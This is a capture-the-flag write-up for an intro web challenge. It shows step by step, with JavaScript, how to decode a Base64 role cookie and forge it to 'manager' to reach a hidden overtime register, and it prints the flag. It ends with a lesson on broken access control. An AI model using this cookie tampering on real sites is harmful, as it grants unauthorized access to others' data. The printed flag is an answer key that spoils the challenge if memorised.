# Phantom Timer

**Challenge title:** Phantom Timer  
**Category:** Web  
**Difficulty:** Intro  
**Points:** 50  
**Author:** Perceval

## File

- Application: https://pointeuse.cyberzerk.fr

## Solution

### Step 1: Inspect the application

After opening the application, the page showed:

- Connected user: `Vous (#8472)`
- Profile: `employe`
- Declared overtime: `0 h`

The page also stated that only a manager profile could consult the actual overtime register.

### Step 2: Inspect the browser cookie

Open DevTools → Console and run:

```javascript
document.cookie
```

The application used a cookie named `profil`:

```text
profil=eyJlbXBsb3llIjoiVm91cyAoIzg0NzIpIiwicm9sZSI6ImVtcGxveWUifQ%3D%3D
```

After URL decoding and Base64 decoding, its contents were:

```json
{
  "employe": "Vous (#8472)",
  "role": "employe"
}
```

This revealed that the role was stored in a client-side cookie.

### Step 3: Modify the role

Change the role from `employe` to `manager` by setting the cookie to the Base64-encoded JSON:

```javascript
const profile = {
  employe: "Vous (#8472)",
  role: "manager"
};

document.cookie =
  "profil=" + encodeURIComponent(btoa(JSON.stringify(profile))) + "; path=/";
```

Refresh the page:

```javascript
location.reload();
```

### Step 4: View the actual overtime register

The application now displayed the manager view with the actual overtime records:

| Employee | Overtime declared | Actual overtime |
|---|---:|---:|
| Marc V. (senior dev) | 0 h | 58 h |
| HR Intern | 0 h | 31 h |
| You (#8472) | 0 h | 44 h |

### Step 5: Obtain the flag

The flag was displayed in the manager view.

## Flag

```text
CyberZerk{P0int3us3_Qu1_0ubl13_L3s_H3ur3s_Sup}
```

## Security Lesson

This challenge demonstrates Broken Access Control through client-side role manipulation. The application trusted a role value stored in a user-editable cookie.

Authorization decisions should be enforced server-side. A client-side role value must not be trusted as proof of a user's permissions.
